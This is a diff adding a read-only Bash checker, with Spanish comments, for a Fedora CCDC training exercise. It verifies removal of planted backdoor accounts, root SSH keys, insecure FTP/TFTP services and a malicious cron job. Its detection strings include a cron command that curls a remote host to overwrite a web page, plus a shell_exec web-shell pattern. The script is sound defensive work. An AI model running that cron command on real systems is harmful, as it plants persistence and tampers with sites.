@@ -1,0 +1,326 @@
+#!/usr/bin/env bash
+set -uo pipefail
+
+# Verifica que se hayan eliminado las configuraciones vulnerables sembradas por
+# redhavi-fedora. Este script no modifica el sistema.
+
+TOTAL_CHECKS=0
+PASSED_CHECKS=0
+FEDORA_ID="unknown"
+
+if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+    GREEN=$'\033[32m'
+    RED=$'\033[31m'
+    CYAN=$'\033[36m'
+    YELLOW=$'\033[33m'
+    RESET=$'\033[0m'
+else
+    GREEN=""
+    RED=""
+    CYAN=""
+    YELLOW=""
+    RESET=""
+fi
+
+usage() {
+    cat <<'EOF'
+Uso: sudo redhavi-check-fedora
+
+Comprueba en Fedora las configuraciones vulnerables sembradas por
+redhavi-fedora. Es de solo lectura: no limpia ni modifica archivos.
+
+Opciones:
+  -h, --help    Muestra esta ayuda.
+
+Ejecutalo como root para revisar el crontab y la clave SSH de root.
+Devuelve 0 cuando todas las comprobaciones pasan y 1 si quedan hallazgos.
+EOF
+}
+
+die() {
+    printf '%s[ERROR]%s %s\n' "$RED" "$RESET" "$*" >&2
+    exit 2
+}
+
+ok() {
+    printf '%s[OK]%s  %s\n' "$GREEN" "$RESET" "$*"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+    PASSED_CHECKS=$((PASSED_CHECKS + 1))
+}
+
+bad() {
+    printf '%s[X]%s   %s\n' "$RED" "$RESET" "$*"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+}
+
+warn() {
+    printf '%s[!]%s   %s\n' "$YELLOW" "$RESET" "$*" >&2
+}
+
+section() {
+    printf '\n%s=== %s ===%s\n\n' "$CYAN" "$1" "$RESET"
+}
+
+parse_args() {
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                die "Opcion no reconocida: $1"
+                ;;
+        esac
+        shift
+    done
+}
+
+require_fedora() {
+    if [ -n "${OS_OVERRIDE:-}" ]; then
+        FEDORA_ID="$OS_OVERRIDE"
+    elif [ -r /etc/os-release ]; then
+        # shellcheck disable=SC1091
+        . /etc/os-release
+        FEDORA_ID="${ID:-unknown}"
+    fi
+
+    [ "$FEDORA_ID" = "fedora" ] || die "Este verificador es solo para Fedora. Detectado: $FEDORA_ID"
+    command -v rpm >/dev/null 2>&1 || die "No se encontro rpm."
+}
+
+require_root() {
+    [ "$(id -u)" -eq 0 ] || die "Ejecuta como root: sudo redhavi-check-fedora"
+}
+
+user_has_admin_group() {
+    local groups
+    local user=$1
+
+    groups="$(id -nG "$user" 2>/dev/null || true)"
+    case " $groups " in
+        *" wheel "*|*" sudo "*)
+            return 0
+            ;;
+        *)
+            return 1
+            ;;
+    esac
+}
+
+check_user() {
+    local password_state
+    local shell
+    local user=$1
+
+    if ! getent passwd "$user" >/dev/null 2>&1; then
+        ok "La cuenta $user fue eliminada."
+        ok "$user no pertenece a un grupo administrativo."
+        return
+    fi
+
+    shell="$(getent passwd "$user" | awk -F: '{print $7}')"
+    password_state="$(passwd -S "$user" 2>/dev/null | awk '{print $2}')"
+
+    case "$shell:$password_state" in
+        */nologin:*|*/false:*|*:LK|*:L)
+            ok "La cuenta $user tiene el inicio de sesion bloqueado."
+            ;;
+        *)
+            bad "La cuenta $user aun permite login (shell: $shell, estado: ${password_state:-desconocido})."
+            ;;
+    esac
+
+    if user_has_admin_group "$user"; then
+        bad "$user aun pertenece a wheel o sudo."
+    else
+        ok "$user no pertenece a wheel ni sudo."
+    fi
+}
+
+check_users() {
+    section "Usuarios y privilegios"
+    check_user ccdc
+    check_user splunk
+}
+
+check_cron() {
+    local cron_content=""
+    local spool
+    local suspicious='curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php'
+
+    section "Persistencia en cron"
+
+    if command -v crontab >/dev/null 2>&1; then
+        cron_content="$(crontab -u root -l 2>/dev/null || true)"
+    fi
+
+    for spool in /var/spool/cron/root /var/spool/cron/crontabs/root; do
+        if [ -r "$spool" ]; then
+            cron_content+=$'\n'
+            cron_content+="$(cat "$spool")"
+        fi
+    done
+
+    if grep -Fq "$suspicious" <<<"$cron_content"; then
+        bad "El cron de root aun contiene la descarga desde 10.5.8.11."
+    else
+        ok "No se encontro el cron malicioso de redhavi-fedora."
+    fi
+}
+
+check_immutable() {
+    local attrs
+    local path=$1
+
+    if [ ! -e "$path" ]; then
+        ok "$path no existe."
+        return
+    fi
+
+    if ! command -v lsattr >/dev/null 2>&1; then
+        warn "No se encontro lsattr; no se conto la comprobacion de $path."
+        return
+    fi
+
+    attrs="$(lsattr -d "$path" 2>/dev/null | awk '{print $1}')"
+    if [[ "$attrs" == *i* ]]; then
+        bad "$path aun tiene el atributo inmutable."
+    else
+        ok "$path no tiene el atributo inmutable."
+    fi
+}
+
+check_root_ssh() {
+    local auth_file="/root/.ssh/authorized_keys"
+    local ssh_mode
+
+    section "Acceso SSH de root"
+    check_immutable "$auth_file"
+
+    if [ -f "$auth_file" ] && grep -Eqv '^[[:space:]]*(#|$)' "$auth_file"; then
+        bad "$auth_file aun contiene claves SSH activas; revisalas manualmente."
+    else
+        ok "No hay claves SSH activas en $auth_file."
+    fi
+
+    if [ -d /root/.ssh ]; then
+        ssh_mode="$(stat -c '%a' /root/.ssh 2>/dev/null || true)"
+        if [ "$ssh_mode" = "700" ]; then
+            ok "/root/.ssh tiene permisos 700."
+        else
+            bad "/root/.ssh tiene permisos ${ssh_mode:-desconocidos}; se esperaba 700."
+        fi
+    else
+        ok "/root/.ssh no existe."
+    fi
+}
+
+check_web() {
+    local matches
+    local web_file
+    local web_files=(
+        /var/www/simple-php-website/index.php
+        /var/www/index.php
+        /var/www/html/index.php
+    )
+
+    section "Contenido web y PHP"
+
+    for web_file in "${web_files[@]}"; do
+        check_immutable "$web_file"
+    done
+
+    if [ ! -d /var/www ]; then
+        ok "/var/www no existe."
+        return
+    fi
+
+    matches="$(grep -RInE --include='*.php' 'shell_exec[[:space:]]*\(' /var/www 2>/dev/null || true)"
+    if [ -n "$matches" ]; then
+        bad "Se encontro shell_exec en archivos PHP:"
+        printf '%s\n' "$matches"
+    else
+        ok "No se encontro shell_exec en archivos PHP bajo /var/www."
+    fi
+}
+
+check_packages() {
+    local package
+    local insecure_packages=(telnet ftp tftp tftp-server vsftpd)
+
+    section "Paquetes inseguros"
+
+    for package in "${insecure_packages[@]}"; do
+        if rpm -q "$package" >/dev/null 2>&1; then
+            bad "El paquete inseguro $package aun esta instalado."
+        else
+            ok "El paquete inseguro $package no esta instalado."
+        fi
+    done
+}
+
+check_services() {
+    local unit
+    local unsafe_units=(vsftpd.service tftp.service tftp.socket)
+
+    section "Servicios inseguros"
+
+    if ! command -v systemctl >/dev/null 2>&1; then
+        warn "No se encontro systemctl; se omitieron las comprobaciones de servicios."
+        return
+    fi
+
+    for unit in "${unsafe_units[@]}"; do
+        if systemctl is-active --quiet "$unit" 2>/dev/null || systemctl is-enabled --quiet "$unit" 2>/dev/null; then
+            bad "$unit aun esta activo o habilitado."
+        else
+            ok "$unit no esta activo ni habilitado."
+        fi
+    done
+}
+
+print_summary() {
+    local failed
+    local percent
+
+    failed=$((TOTAL_CHECKS - PASSED_CHECKS))
+    if [ "$TOTAL_CHECKS" -eq 0 ]; then
+        percent=0
+    else
+        percent=$((100 * PASSED_CHECKS / TOTAL_CHECKS))
+    fi
+
+    section "Resultado final"
+    printf '%sTotal:%s       %d\n' "$YELLOW" "$RESET" "$TOTAL_CHECKS"
+    printf '%sCorrectas:%s   %d\n' "$YELLOW" "$RESET" "$PASSED_CHECKS"
+    printf '%sHallazgos:%s   %d\n' "$YELLOW" "$RESET" "$failed"
+    printf '%sPuntuacion:%s  %d%%\n' "$YELLOW" "$RESET" "$percent"
+
+    if [ "$failed" -eq 0 ]; then
+        printf '\n%sSistema limpio segun las comprobaciones de redhavi-fedora.%s\n' "$GREEN" "$RESET"
+        return 0
+    fi
+
+    printf '\n%sQuedan %d hallazgos por corregir.%s\n' "$RED" "$failed" "$RESET"
+    return 1
+}
+
+main() {
+    parse_args "$@"
+    require_fedora
+    require_root
+
+    printf '\n%s=== Verificacion de limpieza CCDC para Fedora ===%s\n' "$CYAN" "$RESET"
+    printf '%sSistema detectado:%s %s\n' "$YELLOW" "$RESET" "$FEDORA_ID"
+
+    check_users
+    check_cron
+    check_root_ssh
+    check_web
+    check_packages
+    check_services
+    print_summary
+}
+
+main "$@"
